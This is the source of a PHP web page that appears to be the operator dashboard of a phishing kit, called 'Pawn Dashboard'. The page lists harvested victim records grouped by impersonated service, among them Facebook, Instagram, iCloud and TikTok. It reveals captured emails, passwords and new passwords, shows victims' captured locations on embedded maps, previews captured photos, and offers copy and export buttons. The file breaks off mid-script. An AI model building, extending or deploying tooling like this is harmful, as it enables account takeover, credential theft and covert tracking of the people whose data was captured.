<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: ../auth/login/');
    exit;
}

// Include your existing functions (includes db connection)
include_once '../config/function.php';
$limit = 4;
// Ensure user ID is available in session
$userId = isset($_SESSION['user']['id']) ? $_SESSION['user']['id'] : (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : null);
if (!$userId) {
    die("User ID not found in session.");
}

// Fetch all pawn entries for this user once (PHP only loads data, no filtering)
// $stmt = $conn->prepare("SELECT * FROM pawn WHERE user_id = ? ORDER BY created_at DESC");
// $stmt->execute([$userId]);
// $pawnEntries = $stmt->fetchAll(PDO::FETCH_ASSOC);
$pawnEntries = readpawn($userId);
// Get unique pages for filter (for building the filter buttons)
$pages = [];
foreach ($pawnEntries as $entry) {
    if (!empty($entry['page']) && !in_array($entry['page'], $pages)) {
        $pages[] = $entry['page'];
    }
}

// Function to get page icon based on page name
function getPageIcon($page) {
    $icons = [
        'facebook' => 'bi-facebook',
        'instagram' => 'bi-instagram',
        'tiktok' => 'bi-tiktok',
        'twitter' => 'bi-twitter-x',
        'github' => 'bi-github',
        'icloud' => 'bi-apple',
        'spotify' => 'bi-spotify',
        'location' => 'bi-geo-alt-fill',
        'localisation' => 'bi-geo-alt-fill',
        'image' => 'bi-image-fill',
        'photo' => 'bi-camera-fill',
        'wifi' => 'bi-wifi',
        'photomath' => 'bi-camera-fill',
        'telegram' => 'bi-telegram',
        'whatsapp' => 'bi-whatsapp',
        'linkedin' => 'bi-linkedin',
        'youtube' => 'bi-youtube',
        'netflix' => 'bi-film',
        'discord' => 'bi-discord',
        'reddit' => 'bi-reddit',
        'pinterest' => 'bi-pinterest',
        'snapchat' => 'bi-snapchat'
    ];
    
    $pageLower = strtolower($page);
    foreach ($icons as $key => $icon) {
        if (strpos($pageLower, $key) !== false) {
            return $icon;
        }
    }
    return 'bi-grid-3x3-gap-fill';
}

// Function to get page color
function getPageColor($page) {
    $colors = [
        'facebook' => 'bg-blue-600',
        'instagram' => 'bg-pink-600',
        'tiktok' => 'bg-black',
        'twitter' => 'bg-slate-700',
        'github' => 'bg-gray-800',
        'icloud' => 'bg-gray-600',
        'spotify' => 'bg-green-600',
        'location' => 'bg-red-600',
        'localisation' => 'bg-red-600',
        'image' => 'bg-purple-600',
        'photo' => 'bg-yellow-600',
        'wifi' => 'bg-indigo-600',
        'photomath' => 'bg-orange-600'
    ];
    
    $pageLower = strtolower($page);
    foreach ($colors as $key => $color) {
        if (strpos($pageLower, $key) !== false) {
            return $color;
        }
    }
    return 'bg-purple-600';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Dashboard | Aetheris Services</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.4/css/lightbox.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
            background: #02020A;
            overflow-x: hidden;
            min-height: 100vh;
        }

        .glass-card {
            background: rgba(12, 10, 22, 0.78);
            backdrop-filter: blur(18px);
            border: 1px solid rgba(139, 92, 246, 0.35);
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(139, 92, 246, 0.2) inset;
        }

        .pawn-card {
            background: rgba(12, 10, 22, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(139, 92, 246, 0.3);
            transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }
        .pawn-card:hover {
            transform: translateY(-4px);
            border-color: rgba(192, 132, 252, 0.6);
            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.3);
        }

        .btn-primary {
            background: linear-gradient(105deg, #8B5CF6, #C084FC);
            transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3);
        }
        .btn-primary:active { transform: scale(0.96); }
        
        .btn-secondary-copy {
            background: rgba(30, 27, 46, 0.8);
            border: 1px solid rgba(139, 92, 246, 0.5);
            transition: all 0.2s;
        }
        .btn-secondary-copy:active { transform: scale(0.96); }
        .btn-secondary-copy:hover {
            background: rgba(139, 92, 246, 0.3);
            border-color: rgba(192, 132, 252, 0.8);
        }

        .blob-1 {
            position: fixed;
            width: 70vw;
            height: 70vw;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.3) 0%, rgba(76, 29, 149, 0) 70%);
            border-radius: 62% 38% 72% 28% / 46% 45% 55% 54%;
            filter: blur(80px);
            top: -20vh;
            left: -30vw;
            z-index: -2;
            animation: floatBlob 20s infinite alternate ease-in-out;
            pointer-events: none;
        }
        .blob-2 {
            position: fixed;
            width: 75vw;
            height: 75vw;
            background: radial-gradient(circle, rgba(192, 132, 252, 0.28) 0%, rgba(88, 28, 135, 0) 75%);
            bottom: -25vh;
            right: -30vw;
            filter: blur(90px);
            border-radius: 45% 55% 70% 30% / 55% 45% 55% 45%;
            animation: floatBlob2 24s infinite alternate;
            z-index: -2;
        }
        @keyframes floatBlob {
            0% { transform: translate(0, 0) rotate(0deg) scale(1); }
            100% { transform: translate(8%, 12%) rotate(6deg) scale(1.15); }
        }
        @keyframes floatBlob2 {
            0% { transform: translate(0, 0) rotate(0deg) scale(1); }
            100% { transform: translate(-10%, -10%) rotate(-5deg) scale(1.2); }
        }

        .toast-message {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(139,92,246,0.5);
            border-radius: 2rem;
            padding: 0.75rem 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            z-index: 1000;
            font-size: 0.875rem;
            font-weight: 500;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
            animation: toastFade 0.3s ease;
        }
        @keyframes toastFade {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .gallery-img {
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            max-height: 160px;
            width: 100%;
            object-fit: cover;
        }
        .gallery-img:hover {
            transform: scale(1.02);
            opacity: 0.9;
        }
        
        .map-preview {
            width: 100%;
            height: 220px;
            border-radius: 12px;
            overflow: hidden;
            background: #1a1a2e;
        }
        .map-preview iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .fab-container {
            position: fixed;
            bottom: 28px;
            right: 28px;
            z-index: 999;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }
        
        .fab-action {
            width: 48px;
            height: 48px;
            border-radius: 24px;
            background: rgba(20, 18, 35, 0.95);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(139, 92, 246, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 6px 14px rgba(0,0,0,0.4);
            transform: translateY(0) scale(1);
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        
        .fab-action.active {
            opacity: 1;
            visibility: visible;
            pointer-events: auto;
        }
        
        .fab-action.move-up1.active { transform: translateY(-56px); }
        .fab-action.move-up2.active { transform: translateY(-112px); }
        .fab-action.move-up3.active { transform: translateY(-168px); }
        
        .fab-main {
            width: 56px;
            height: 56px;
            border-radius: 28px;
            background: linear-gradient(135deg, #8B5CF6, #C084FC);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(139, 92, 246, 0.5);
            transition: all 0.2s;
            border: none;
            color: white;
            font-size: 26px;
        }
        .fab-main:active { transform: scale(0.92); }
        .fab-main i { transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1); }
        .fab-main.rotate-plus i { transform: rotate(45deg); }
        
        .fab-action::after {
            content: attr(data-tooltip);
            position: absolute;
            right: 62px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            color: #ddd;
            white-space: nowrap;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.2s;
            border: 1px solid rgba(139,92,246,0.5);
            font-family: 'Inter', monospace;
        }
        .fab-action:hover::after { opacity: 1; }
        
        @media (max-width: 640px) {
            .fab-container { bottom: 20px; right: 20px; gap: 6px; }
            .fab-main { width: 50px; height: 50px; font-size: 24px; }
            .fab-action { width: 42px; height: 42px; }
            .fab-action.move-up1.active { transform: translateY(-50px); }
            .fab-action.move-up2.active { transform: translateY(-98px); }
            .fab-action.move-up3.active { transform: translateY(-146px); }
        }
        
        .page-pill {
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .page-pill:hover {
            transform: translateY(-2px);
        }
        .page-pill.active {
            background: linear-gradient(105deg, #8B5CF6, #C084FC) !important;
            color: white !important;
            border-color: transparent !important;
        }
        
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: #8B5CF6;
            border-radius: 10px;
        }
        
        /* Animation for filtering */
        .pawn-card {
            transition: all 0.3s ease;
        }
        .pawn-card.filtered-out {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="blob-1"></div>
<div class="blob-2"></div>
<div class="fixed inset-0 bg-black/20 backdrop-blur-[2px] -z-10"></div>

<div class="max-w-7xl mx-auto px-4 py-6 sm:py-8 md:py-10">
    <!-- Header -->
    <div class="flex flex-col sm:flex-row justify-between items-center mb-8 gap-4">
        <div>
            <h1 class="text-3xl sm:text-4xl font-extrabold bg-gradient-to-r from-purple-300 to-fuchsia-400 bg-clip-text text-transparent">
                <i class="bi bi-grid-3x3-gap-fill"></i> Pawn Dashboard
            </h1>
            <p class="text-gray-400 text-sm mt-1"><i class="bi bi-database"></i> Manage your stored credentials & data</p>
        </div>
        <div class="glass-card rounded-full px-5 py-2 flex items-center gap-2">
            <i class="bi bi-file-text-fill text-purple-300"></i>
            <span class="text-sm text-white/80 font-medium" id="recordCount"><?= count($pawnEntries) ?> records</span>
        </div>
    </div>

    <!-- Page Filters - JavaScript only -->
    <div class="glass-card rounded-2xl p-4 mb-6">
        <div class="flex flex-wrap gap-2 items-center">
            <span class="text-gray-300 text-sm font-medium"><i class="bi bi-tag-fill mr-1"></i>Filter by Page:</span>
            <button class="page-pill px-4 py-2 rounded-full text-sm font-medium transition-all" style="background: linear-gradient(105deg, #8B5CF6, #C084FC); color: white;" data-page="all">
                <i class="bi bi-grid-3x3-gap-fill"></i> All
            </button>
            <?php foreach ($pages as $page): ?>
            <button class="page-pill px-4 py-2 rounded-full text-sm font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="<?= htmlspecialchars(strtolower($page)) ?>">
                <i class="<?= getPageIcon($page) ?>"></i> <?= htmlspecialchars(ucfirst($page)) ?>
            </button>
            <?php endforeach; ?>
            <?php 
            $hasLocation = false;
            $hasImage = false;
            foreach ($pages as $p) {
                $pLower = strtolower($p);
                if (strpos($pLower, 'location') !== false || strpos($pLower, 'localisation') !== false) {
                    $hasLocation = true;
                }
                if (strpos($pLower, 'image') !== false || strpos($pLower, 'photo') !== false) {
                    $hasImage = true;
                }
            }
            ?>
            <?php if (!$hasLocation): ?>
            <button class="page-pill px-4 py-2 rounded-full text-sm font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="location">
                <i class="bi bi-geo-alt-fill"></i> Locations
            </button>
            <?php endif; ?>
            <?php if (!$hasImage): ?>
            <button class="page-pill px-4 py-2 rounded-full text-sm font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="image">
                <i class="bi bi-image-fill"></i> Images
            </button>
            <?php endif; ?>
            <button class="page-pill px-4 py-2 rounded-full text-sm font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="credentials">
                <i class="bi bi-key-fill"></i> Credentials
            </button>
        </div>
    </div>

    <!-- Search Bar - JavaScript only -->
    <div class="glass-card rounded-2xl p-4 mb-8">
        <div class="flex flex-wrap gap-4 items-center">
            <div class="flex-1 relative">
                <i class="bi bi-search absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                <input type="text" id="searchInput" placeholder="Search by email, password, content, or page..." class="w-full pl-10 pr-4 py-2 bg-black/40 border border-purple-500/30 rounded-xl text-sm text-white placeholder-gray-400 focus:outline-none focus:border-purple-400">
            </div>
            <div class="flex gap-2">
                <button id="clearFilters" class="px-4 py-2 rounded-xl bg-white/10 text-gray-300 hover:bg-white/20 transition-all text-sm">
                    <i class="bi bi-x-circle"></i> Clear All
                </button>
            </div>
        </div>
    </div>

    <!-- Pawn Cards Grid - All cards rendered by PHP, filtered by JS -->
    <div id="cardsContainer" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
        <?php foreach ($pawnEntries as $entry): ?>
        <?php 
            $limit--;
            $pageName = $entry['page'] ?: 'general';
            $pageIcon = getPageIcon($pageName);
            $pageColor = getPageColor($pageName);
            $isLocation = (strpos(strtolower($pageName), 'location') !== false || strpos(strtolower($pageName), 'localisation') !== false);
            $isImage = (strpos(strtolower($pageName), 'image') !== false || strpos(strtolower($pageName), 'photo') !== false);
            $isCredentials = !$isLocation && !$isImage;
            $createdAt = date('Y-m-d H:i:s', strtotime($entry['created_at']));
            
            $locationUrl = $isLocation ? $entry['email'] : '';
            $mapData = $entry['password'];
            $imagePath = $isImage ? $entry['email'] : '';
            $credEmail = $entry['email'];
            $credPassword = $entry['password'];
            $newPassword = $entry['newpassword'];
            
            // Build search text for JS filtering
            $searchText = strtolower($pageName . ' ' . $entry['email'] . ' ' . $entry['password'] . ' ' . ($entry['newpassword'] ?: ''));
        ?>
        
        <div class="pawn-card rounded-2xl p-5 transition-all duration-200 flex flex-col" 
             data-page="<?= htmlspecialchars(strtolower($pageName)) ?>"
             data-type="<?= $isLocation ? 'location' : ($isImage ? 'image' : 'credentials') ?>"
             data-search="<?= htmlspecialchars($searchText) ?>">
            
            <!-- Header with page logo and badge -->
            <div class="flex items-center justify-between mb-4">
                <div class="flex items-center gap-3">
                    <div class="w-12 h-12 rounded-xl <?= $pageColor ?> bg-opacity-30 flex items-center justify-center border border-white/20 shadow-lg">
                        <i class="<?= $pageIcon ?> text-2xl text-white drop-shadow-sm"></i>
                    </div>
                    <div>
                        <h3 class="text-lg font-bold text-white flex items-center gap-2">
                            <i class="<?= $pageIcon ?> text-purple-400 text-sm"></i>
                            <?= htmlspecialchars(ucfirst($pageName)) ?>
                        </h3>
                        <p class="text-gray-400 text-xs"><i class="bi bi-hash"></i> ID: <?= $entry['id'] ?></p>
                    </div>
                </div>
                <span class="text-xs px-2 py-1 rounded-full flex items-center gap-1 <?= $isLocation ? 'bg-red-900/50 text-red-300' : ($isImage ? 'bg-green-900/50 text-green-300' : 'bg-yellow-900/50 text-yellow-300') ?>">
                    <i class="<?= $isLocation ? 'bi bi-geo-alt-fill' : ($isImage ? 'bi bi-image-fill' : 'bi bi-key-fill') ?>"></i>
                    <?= $isLocation ? 'Location' : ($isImage ? 'Image' : 'Credentials') ?>
                </span>
            </div>
            
            <!-- Content based on type -->
            <div class="mb-4">
                <?php if ($isLocation): ?>
                    <!-- Location Page -->
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1">
                            <i class="bi bi-geo-alt-fill"></i> Location URL
                        </div>
                        <div class="bg-black/30 rounded-xl px-3 py-2 font-mono text-sm text-white break-all">
                            <i class="bi bi-link-45deg text-purple-400 mr-1"></i>
                            <a href="<?= htmlspecialchars($locationUrl) ?>" target="_blank" class="text-purple-400 hover:underline">
                                <?= htmlspecialchars($locationUrl) ?>
                            </a>
                        </div>
                    </div>
                    
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1"><i class="bi bi-map-fill"></i> Map Preview</div>
                        <div class="map-preview">
                            <?php 
                            $embedUrl = $locationUrl;
                            if (preg_match('/q=([-\d\.]+),([-\d\.]+)/', $locationUrl, $coords)) {
                                $embedUrl = "https://maps.google.com/maps?q={$coords[1]},{$coords[2]}&z=15&output=embed";
                            } elseif (preg_match('/@([-\d\.]+),([-\d\.]+)/', $locationUrl, $coords)) {
                                $embedUrl = "https://maps.google.com/maps?q={$coords[1]},{$coords[2]}&z=15&output=embed";
                            } elseif (filter_var($locationUrl, FILTER_VALIDATE_URL)) {
                                $embedUrl = rtrim($locationUrl, '/') . (strpos($locationUrl, '?') ? '&' : '?') . 'output=embed';
                            }
                            ?>
                            <iframe src="<?= htmlspecialchars($embedUrl) ?>" loading="lazy"></iframe>
                        </div>
                    </div>
                    
                <?php elseif ($isImage): ?>
                    <!-- Image Page -->
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1">
                            <i class="bi bi-folder-fill"></i> Image Path
                        </div>
                        <div class="bg-black/30 rounded-xl px-3 py-2 font-mono text-sm text-white break-all">
                            <i class="bi bi-file-image text-green-400 mr-1"></i>
                            <?= htmlspecialchars($imagePath) ?>
                        </div>
                    </div>
                    
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1"><i class="bi bi-image-fill"></i> Image Preview</div>
                        <?php 
                        $fullImagePath = $imagePath;
                        if (!preg_match('/^https?:\/\//', $fullImagePath)) {
                            $fullImagePath = '../' . ltrim($fullImagePath, './');
                        }
                        ?>
                        <a href="<?= htmlspecialchars($fullImagePath) ?>" data-lightbox="gallery" data-title="Image from <?= htmlspecialchars($pageName) ?>">
                            <img src="<?= htmlspecialchars($fullImagePath) ?>" alt="Gallery image" class="gallery-img rounded-xl border border-purple-500/30" onerror="this.src='https://placehold.co/400x300/1a1a2e/8B5CF6?text=Image+Preview+Not+Available'">
                        </a>
                    </div>
                    
                <?php else: ?>
                    <!-- Credentials Display -->
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1">
                            <i class="bi bi-envelope-fill"></i> Email
                        </div>
                        <div class="bg-black/30 rounded-xl px-3 py-2 font-mono text-sm text-white break-all">
                            <i class="bi bi-envelope text-purple-400 mr-1"></i>
                            <?= htmlspecialchars($credEmail) ?>
                        </div>
                    </div>
                    
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1"><i class="bi bi-lock-fill"></i> Password</div>
                        <div class="bg-black/30 rounded-xl px-3 py-2 font-mono text-sm text-white break-all flex justify-between items-center">
                            <span id="pass_<?= $entry['id'] ?>">••••••••</span>
                            <button onclick="togglePassword(<?= $entry['id'] ?>, '<?= addslashes($credPassword) ?>')" class="text-purple-400 hover:text-purple-300 ml-2">
                                <i class="bi bi-eye-fill"></i>
                            </button>
                        </div>
                    </div>
                    
                    <?php if (!empty($newPassword)): ?>
                    <div class="mb-3">
                        <div class="text-gray-400 text-xs mb-1"><i class="bi bi-arrow-repeat"></i> New Password</div>
                        <div class="bg-black/30 rounded-xl px-3 py-2 font-mono text-sm text-white break-all flex justify-between items-center">
                            <span id="newpass_<?= $entry['id'] ?>">••••••••</span>
                            <button onclick="toggleNewPassword(<?= $entry['id'] ?>, '<?= addslashes($newPassword) ?>')" class="text-purple-400 hover:text-purple-300 ml-2">
                                <i class="bi bi-eye-fill"></i>
                            </button>
                        </div>
                    </div>
                    <?php endif; ?>
                <?php endif; ?>
            </div>
            
            <!-- Footer with timestamp and copy actions -->
            <div class="flex justify-between items-center gap-3 mt-auto pt-3 border-t border-purple-500/20">
                <span class="text-xs text-gray-500">
                    <i class="bi bi-clock"></i> <?= $createdAt ?>
                </span>
                <div class="flex gap-2">
                    <?php if ($isLocation): ?>
                        <button onclick="copyToClipboard('<?= addslashes($locationUrl) ?>', 'Location URL')" 
                                class="btn-secondary-copy text-white w-8 h-8 rounded-lg flex items-center justify-center transition-all" title="Copy Location URL">
                            <i class="bi bi-geo-alt-fill"></i>
                        </button>
                        <button onclick="copyToClipboard('<?= addslashes($mapData) ?>', 'Map Data')" 
                                class="btn-secondary-copy text-white w-8 h-8 rounded-lg flex items-center justify-center transition-all" title="Copy Map Data">
                            <i class="bi bi-map"></i>
                        </button>
                    <?php elseif ($isImage): ?>
                        <button onclick="copyImage('<?= htmlspecialchars($fullImagePath) ?>')" 
                                class="btn-secondary-copy text-white w-8 h-8 rounded-lg flex items-center justify-center transition-all" title="Copy Image">
                            <i class="bi bi-image-fill"></i>
                        </button>
                    <?php else: ?>
                        <button onclick="copyToClipboard('<?= addslashes($credEmail) ?>', 'Email')" 
                                class="btn-secondary-copy text-white w-8 h-8 rounded-lg flex items-center justify-center transition-all" title="Copy Email">
                            <i class="bi bi-envelope-fill"></i>
                        </button>
                        <button onclick="copyToClipboard('<?= addslashes($credPassword) ?>', 'Password')" 
                                class="btn-secondary-copy text-white w-8 h-8 rounded-lg flex items-center justify-center transition-all" title="Copy Password">
                            <i class="bi bi-key-fill"></i>
                        </button>
                        <?php if (!empty($newPassword)): ?>
                        <button onclick="copyToClipboard('<?= addslashes($newPassword) ?>', 'New Password')" 
                                class="btn-secondary-copy text-white w-8 h-8 rounded-lg flex items-center justify-center transition-all" title="Copy New Password">
                            <i class="bi bi-arrow-repeat"></i>
                        </button>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
    
    <?php if (empty($pawnEntries)): ?>
    <div class="glass-card rounded-2xl p-12 text-center">
        <i class="bi bi-inbox-fill text-5xl text-purple-500/50 mb-4 block"></i>
        <p class="text-gray-400"><i class="bi bi-database-slash"></i> No pawn entries found.</p>
        <p class="text-gray-500 text-sm mt-2">Your stored credentials will appear here.</p>
    </div>
    <?php endif; ?>
</div>

<!-- Floating Action Menu -->
<div class="fab-container">
    <div class="fab-action move-up3" data-tooltip="Statistics" id="fabStats">
        <i class="bi bi-graph-up text-xl text-white"></i>
    </div>
    <div class="fab-action move-up2" data-tooltip="Export Data" id="fabExport">
        <i class="bi bi-download text-xl text-white"></i>
    </div>
    <div class="fab-action move-up1" data-tooltip="Back to Board" id="fabBoard">
        <i class="bi bi-grid-3x3-gap-fill text-xl text-white"></i>
    </div>
    <div class="fab-main" id="fabMain">
        <i class="bi bi-plus-lg text-2xl"></i>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
    function showToast(message, type = "info") {
        const existingToast = document.querySelector('.toast-message');
        if (existingToast) existingToast.remove();
        const toast = document.createElement('div');
        toast.className = 'toast-message';
        let icon = '<i class="bi bi-info-circle-fill text-purple-400"></i>';
        if (type === "success") icon = '<i class="bi bi-check-circle-fill text-green-400"></i>';
        if (type === "error") icon = '<i class="bi bi-exclamation-triangle-fill text-red-400"></i>';
        toast.innerHTML = `${icon}<span class="text-white">${message}</span>`;
        document.body.appendChild(toast);
        setTimeout(() => { if (toast.remove) toast.remove(); }, 3000);
    }

    async function copyToClipboard(text, label) {
        try {
            await navigator.clipboard.writeText(text);
            showToast(`${label} copied`, "success");
        } catch (err) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showToast(`${label} copied`, "success");
        }
    }

    async function copyImage(url) {
        try {
            const response = await fetch(url);
            const blob = await response.blob();
            await navigator.clipboard.write([
                new ClipboardItem({ [blob.type]: blob })
            ]);
            showToast('Image copied to clipboard', 'success');
        } catch (err) {
            console.error('Failed to copy image:', err);
            showToast('Failed to copy image', 'error');
        }
    }

    try {
        lightbox.option({
            'resizeDuration': 200,
            'wrapAround': true,
            'albumLabel': 'Image %1 of %2',
            'fadeDuration': 300
        });
    } catch (e) {
        console.warn('Lightbox failed to initialize:', e);
    }


    function showToast(message, type = "info") {
        const existingToast = document.querySelector('.toast-message');
        if (existingToast) existingToast.remove();
        const toast = document.createElement('div');
        toast.className = 'toast-message';
        let icon = '<i class="bi bi-info-circle-fill text-purple-400"></i>';
        if (type === "success") icon = '<i class="bi bi-check-circle-fill text-green-400"></i>';
        if (type === "error") icon = '<i class="bi bi-exclamation-triangle-fill text-red-400"></i>';
        toast.innerHTML = `${icon}<span class="text-white">${message}</span>`;
        document.body.appendChild(toast);
        setTimeout(() => { if (toast.remove) toast.remove(); }, 3000);
    }

    async function copyImage(url) {
        try {
            const response = await fetch(url);
            const blob = await response.blob();
            await navigator.clipboard.write([
                new ClipboardItem({ [blob.type]: blob })
            ]);
            showToast('Image copied to clipboard', 'success');
        } catch (err) {
            console.error('Failed to copy image:', err);
            showToast('Failed to copy image', 'error');
        }
    }

    function togglePassword(id, password) {
        const span = document.getElementById(`pass_${id}`);
        const icon = span.nextElementSibling.querySelector('i');
        if (span.innerText === '••••••••') {
            span.innerText = password;
            icon.classList.remove('bi-eye-fill');
            icon.classList.add('bi-eye-slash-fill');
        } else {
            span.innerText = '••••••••';
            icon.classList.remove('bi-eye-slash-fill');
            icon.classList.add('bi-eye-fill');
        }
    }

    function toggleNewPassword(id, newpassword) {
        const span = document.getElementById(`newpass_${id}`);
        const icon = span.nextElementSibling.querySelector('i');
        if (span.innerText === '••••••••') {
            span.innerText = newpassword;
            icon.classList.remove('bi-eye-fill');
            icon.classList.add('bi-eye-slash-fill');
        } else {
            span.innerText = '••••••••';
            icon.classList.remove('bi-eye-slash-fill');
            icon.classList.add('bi-eye-fill');
        }
    }

    // ==================== JAVASCRIPT ONLY FILTERING ====================
    let currentPageFilter = 'all';
    let currentSearch = '';

    function filterCards() {
        console.log('filterCards called with page filter:', currentPageFilter, 'search:', currentSearch);
        const cards = document.querySelectorAll('#cardsContainer .pawn-card');
        console.log('Found', cards.length, 'pawn cards');
        let visibleCount = 0;
        
        cards.forEach(card => {
            let show = true;
            const page = card.dataset.page;
            const type = card.dataset.type;
            const searchText = (card.dataset.search || '').toLowerCase();
            
            // Page/Type filter
            if (currentPageFilter !== 'all') {
                // Check if filter is by page name or by type
                if (currentPageFilter === 'location' && type !== 'location') {
                    show = false;
                } else if (currentPageFilter === 'image' && type !== 'image') {
                    show = false;
                } else if (currentPageFilter === 'credentials' && type !== 'credentials') {
                    show = false;
                } else if (currentPageFilter !== 'location' && currentPageFilter !== 'image' && currentPageFilter !== 'credentials') {
                    // Filter by exact page name
                    if (page.toLowerCase() !== currentPageFilter.toLowerCase()) {
                        show = false;
                    }
                }
            }
            
            // Search filter
            if (show && currentSearch) {
                const searchTerm = currentSearch.toLowerCase();
                if (!searchText.includes(searchTerm)) {
                    show = false;
                }
            }
            
            if (show) {
                card.style.display = 'flex';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });
        
        // Update record count
        const totalCards = cards.length;
        const recordCountSpan = document.getElementById('recordCount');
        if (recordCountSpan) {
            recordCountSpan.innerHTML = `${visibleCount} / ${totalCards} records`;
        }
        
        // Show/hide empty message
        let emptyMsg = document.getElementById('emptyFilterMsg');
        if (visibleCount === 0 && totalCards > 0) {
            if (!emptyMsg) {
                emptyMsg = document.createElement('div');
                emptyMsg.id = 'emptyFilterMsg';
                emptyMsg.className = 'glass-card rounded-2xl p-12 text-center col-span-full';
                emptyMsg.innerHTML = '<i class="bi bi-filter-circle-fill text-5xl text-purple-500/50 mb-4 block"></i><p class="text-gray-400"><i class="bi bi-search-slash"></i> No matching records found.</p><p class="text-gray-500 text-sm mt-2">Try changing your filters or search terms.</p>';
                document.getElementById('cardsContainer').appendChild(emptyMsg);
            } else {
                emptyMsg.style.display = 'block';
            }
        } else if (emptyMsg) {
            emptyMsg.style.display = 'none';
        }
        console.log('Filtering complete, visible count:', visibleCount);
    }

    // Page filter buttons
    console.log('Attaching page filter listeners');
    document.querySelectorAll('.page-pill').forEach(btn => {
        console.log('Attaching to button:', btn.dataset.page);
        btn.addEventListener('click', () => {
            console.log('Page filter clicked:', btn.dataset.page);
            // Update active state
            document.querySelectorAll('.page-pill').forEach(b => {
                b.style.background = 'rgba(255,255,255,0.1)';
                b.style.color = '#d1d5db';
            });
            btn.style.background = 'linear-gradient(105deg, #8B5CF6, #C084FC)';
            btn.style.color = 'white';
            
            // Update filter and apply
            currentPageFilter = btn.dataset.page;
            console.log('currentPageFilter set to:', currentPageFilter);
            filterCards();
        });
    });
    
    // Search input with debounce for better performance
    const searchInput = document.getElementById('searchInput');
    console.log('Search input element found:', !!searchInput);
    let searchTimeout;
    if (searchInput) {
        console.log('Attaching search input listener');
        searchInput.addEventListener('input', () => {
            console.log('Search input event triggered');
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                console.log('Search timeout fired, value:', searchInput.value);
                currentSearch = searchInput.value;
                console.log('currentSearch set to:', currentSearch);
                filterCards();
            }, 300);
        });
    }
    
    // Clear all filters
    const clearBtn = document.getElementById('clearFilters');
    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            // Reset page filter UI
            document.querySelectorAll('.page-pill').forEach(b => {
                b.style.background = 'rgba(255,255,255,0.1)';
                b.style.color = '#d1d5db';
            });
            const allBtn = document.querySelector('.page-pill[data-page="all"]');
            if (allBtn) {
                allBtn.style.background = 'linear-gradient(105deg, #8B5CF6, #C084FC)';
                allBtn.style.color = 'white';
            }
            
            // Reset filters
            currentPageFilter = 'all';
            currentSearch = '';
            if (searchInput) searchInput.value = '';
            filterCards();
